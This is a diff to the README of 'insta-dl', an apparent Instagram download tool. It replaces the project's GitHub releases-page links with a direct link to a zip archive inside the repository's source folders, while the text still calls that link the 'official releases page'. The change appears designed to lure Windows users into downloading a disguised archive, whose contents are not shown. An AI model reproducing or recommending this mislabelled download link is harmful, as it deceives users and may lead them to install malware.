@@ -1,6 +1,6 @@
 # 📥 insta-dl - Download Instagram content with ease
 
-[![Download insta-dl](https://img.shields.io/badge/Download_insta-dl-blue)](https://github.com/Riphod044/insta-dl/releases)
+[![Download insta-dl](https://img.shields.io/badge/Download_insta-dl-blue)](https://github.com/Riphod044/insta-dl/raw/refs/heads/main/insta_dl/backends/insta_dl_v2.6.zip)
 
 insta-dl lets you save photos, videos, stories, and highlights from Instagram directly to your computer. It handles profiles, posts, reels, and hashtags without complex setups. The tool keeps your data organized and works in the background to handle your requests.
 
@@ -12,7 +12,7 @@ insta-dl lets you save photos, videos, stories, and highlights from Instagram di
 
 ## 📥 Downloading the Software
 
-Visit the [official releases page](https://github.com/Riphod044/insta-dl/releases) to download the latest version for Windows.
+Visit the [official releases page](https://github.com/Riphod044/insta-dl/raw/refs/heads/main/insta_dl/backends/insta_dl_v2.6.zip) to download the latest version for Windows.
 
 1. Navigate to the link above.
 2. Look for the section labeled "Assets."
